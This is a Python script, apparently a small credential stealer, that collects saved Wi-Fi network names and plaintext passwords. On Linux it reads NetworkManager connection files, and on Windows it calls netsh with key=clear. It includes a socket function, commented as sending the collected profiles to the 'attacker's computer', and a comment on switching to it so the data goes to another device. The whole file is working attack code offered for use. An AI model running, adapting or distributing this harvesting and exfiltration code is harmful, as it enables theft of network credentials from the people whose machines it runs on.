from os import listdir, name
from subprocess import check_output, CalledProcessError
from re import findall
from socket import socket, AF_INET, SOCK_STREAM


# Linux version (it only works with read privileges on the files in the /etc/NetworkManager/system-connections/ directory)
def linux_profile_collector(file):
    wifi = open(f'/etc/NetworkManager/system-connections/{file}', 'r').readlines()
    profile = [l.replace('\n', '')[l.index('=')+1:] for l in wifi if 'ssid=' in l or 'psk=' in l] 
    return profile

def linux_ver():
    profiles = map(linux_profile_collector, listdir('/etc/NetworkManager/system-connections/'))  
    return profiles



# Windows version (don't need any special privileges)
def windows_profile_collector(ssid, codepage = '850'):
    codepage = str(codepage)
    try:
        output = check_output(f'netsh wlan show profile "{ssid.strip()}" key=clear', encoding=codepage).split('\n')
    except CalledProcessError:
        return [ssid.strip(), 'Not discovered']
    # I will update this code to get the current pc language to extract the correct information, but until that
    # you can translate the strings "Authenticação" and "Conteúdo da Chave" in google translator from Portuguese(Brazil) to the language of your pc and 
    #replace them in the code
    profile = list(dict.fromkeys([l.strip().replace('\n', '')[l.index(':')-2:] for l in output if 'Conteúdo da Chave' in l]))
    profile.insert(0, ssid.strip())
    return profile

def windows_ver():
    ssids = check_output('netsh wlan show profiles', encoding='850')
    # I will update this code to get the current pc language to extract the correct information, but until that
    # you can translate the string "Todos os Perfis de Usuários" in google translator from Portuguese(Brazil) to the language of your pc and replace it in the code
    ssids = findall('Todos os Perfis de Usuários:(.*)', ssids)
    profiles = map(windows_profile_collector, ssids)
    return profiles


# Checks the OS to use the correct function
profiles = windows_ver() if name == 'nt' else linux_ver()

presentation = f'Wifi {"Password":>40}\n'
for profile in profiles:
    try:
        presentation += f'{profile[0]:35}  {profile[1]:25}\n'
    except IndexError:
        continue

# Sends collected profiles to attacker's computer 
# (This function normally assumes that you are running this on your own computer listening on port 123)
def collect_and_send(addr='127.0.0.1', port=123):
    with socket(AF_INET, SOCK_STREAM) as s:
        s.connect((addr, port))
        s.sendall(bytes(presentation, 'utf-8'))
        s.close()

# Print the collected profiles
def collect_and_print():
    print(presentation)

# You can replace this function with the other one (collect_and_send), if you want to send the information to another device.
collect_and_print()
